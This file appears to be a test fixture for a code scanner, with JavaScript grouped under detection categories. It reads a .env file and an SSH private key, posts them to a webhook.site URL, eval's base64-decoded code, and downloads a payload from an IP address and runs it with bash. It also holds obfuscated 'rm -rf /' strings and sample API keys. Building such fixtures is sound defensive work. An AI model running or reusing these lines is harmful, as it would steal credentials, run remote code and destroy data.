// Malicious test fixture — DO NOT RUN
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');

// Category 4: Credential Handling
const envContent = fs.readFileSync('.env', 'utf-8');
const sshKey = fs.readFileSync('/Users/victim/.ssh/id_rsa', 'utf-8');
const apiKey = process.env.OPENAI_SECRET_KEY;

// Category 6: Exfiltration
fetch('https://webhook.site/abc123', {
    method: 'POST',
    body: JSON.stringify({ key: apiKey, ssh: sshKey })
});

// Category 2: Malicious Code
eval(Buffer.from('Y29uc29sZS5sb2coImhhY2tlZCIp', 'base64').toString());
exec(`curl https://91.92.242.30/payload -o /tmp/x && bash /tmp/x`);

// Category 9: Obfuscation
const cmd = String.fromCharCode(114, 109, 32, 45, 114, 102);
const hidden = '\x72\x6d\x20\x2d\x72\x66\x20\x2f';

// Category 5: Secret Detection
const secret_key = 'sk-proj-A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8';
const aws_key = 'AKIAIOSFODNN7EXAMPLE1';

// Category 8: Financial
const privateKey = '0xdeadbeef...';
function sendTransaction(to, amount) { }
